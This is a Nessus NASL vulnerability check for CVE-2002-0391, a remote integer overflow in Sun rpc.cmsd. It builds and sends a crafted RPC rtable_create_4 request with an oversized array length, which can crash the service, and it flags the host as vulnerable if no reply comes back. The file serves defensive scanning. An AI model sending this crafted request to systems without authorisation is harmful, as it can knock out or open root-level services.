#
# This script was written by Xue Yong Zhi <xueyong@udel.edu>
#
# See the Nessus Scripts License for details
#
# Data structure of cms_create_args(maybe wrong)
# struct cms_pid_t {
#	long pid;
# };
# struct cms_create_args {
#	char *str1;
#	char *str2;
#	struct cms_pid_t mypid;
#	struct {
#		u_int myarray_len;
#		long *myarray_val;
#	} myarray;
# };
#
# Successfuly tested against Solaris 8
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (9/6/09)


include("compat.inc");

if (description)
{
  script_id(11418);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/02/16 21:23:30 $");

  script_cve_id("CVE-2002-0391");
  script_bugtraq_id(5356);
  script_osvdb_id(16003);

  script_name(english:"Sun rpc.cmsd Remote Overflow");
  script_summary(english:"Checks Sun rpc.cmsd overflow");

  script_set_attribute(attribute:"synopsis", value:"Arbitrary code may be run on the remote server.");
  script_set_attribute(attribute:"description", value:
"The remote Sun rpc.cmsd has integer overflow problem in xdr_array. An
attacker may use this flaw to execute arbitrary code on this host with
the privileges rpc.cmsd is running as (typically, root), by sending a
specially crafted request to this service.");
  script_set_attribute(attribute:"solution", value:"We suggest that you disable this service and apply a new patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/08/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/19");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK); # rpc.cmsd is started from inetd
  script_copyright(english:"This script is Copyright (C) 2003-2017 Xue Yong Zhi");
  script_family(english:"RPC");

  script_dependencie("rpc_portmap.nasl");
  script_require_keys("rpc/portmap", "Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("nfs_func.inc");
include("sunrpc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

RPC_PROG = 100068;
tcp = 0;
port = get_rpc_port2(program:RPC_PROG, protocol:IPPROTO_UDP);
if (! port || ! get_udp_port_state(port)) {
	port = get_rpc_port2(program:RPC_PROG, protocol:IPPROTO_TCP);
	tcp = 1;
	if (! port) exit(0);
	if (! get_tcp_port_state(port)) exit(0, "TCP port "+port+" is not open.");
}

	if(tcp) {
		soc = open_sock_tcp(port);
	} else {
		soc = open_sock_udp(port);
	}

	pad = padsz(len:strlen(this_host_name()));
	len = 20 + strlen(this_host_name()) + pad;

	# First, make sure there is a RPC service running behind, so
	# we send a bogus request to get an error back
	req1 = rpclong(val:rand()) +
		rpclong(val:0) +
		rpclong(val:2) +
		rpclong(val:100070) +
		rpclong(val:4) +
		rpclong(val:21);

	send(socket:soc, data:req1);
	r = recv(socket:soc, length:4096);
	close(soc);
	if(!r)exit(0);

	if(tcp) {
		soc = open_sock_tcp(port);
	} else {
		soc = open_sock_udp(port);
	}


	req = 	rpclong(val:rand()) +   	#unsigned int xid;
		rpclong(val:0) +      		#msg_type mtype case CALL(0):
		rpclong(val:2) +      		#unsigned int rpcvers;/* must be equal to two (2) */
		rpclong(val:100068) + 		#unsigned int prog(CMSD);
		rpclong(val:4) +      		#unsigned int vers(4);
		rpclong(val:21) +      		#unsigned int proc(rtable_create_4);
		rpclong(val:1) +      		#AUTH_UNIX
		rpclong(val:len) +    		#len
		rpclong(val:rand()) + 		#stamp
		rpclong(val:strlen(this_host_name())) + #length
		this_host_name() +            	#contents(Machine name)
		rpcpad(pad:pad) +     		#fill bytes
		rpclong(val:0)  +     		#uid
		rpclong(val:0)  +     		#gid
		rpclong(val:0)  +     		#auxiliary gids
		rpclong(val:0)  +     		#AUTH_NULL
		rpclong(val:0)  +		#len
		rpclong(val:1)  +		#strlen of str1
		rpclong(val:67)  +		#str1
		rpclong(val:1)  +		#strlen of str2
		rpclong(val:67)  +		#str2
		rpclong(val:0)  + 		#pid
		rpclong(val:1073741825) +	#array size
		rpclong(val:0)  +		#content of array(this one and below)
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0)  +
		rpclong(val:0);

	send(socket:soc, data:req);
	r = recv(socket:soc, length:4096);
	if(!r) {
		if(tcp)
			security_hole(port);
		else
			security_hole(port:port, proto:"udp");
	}
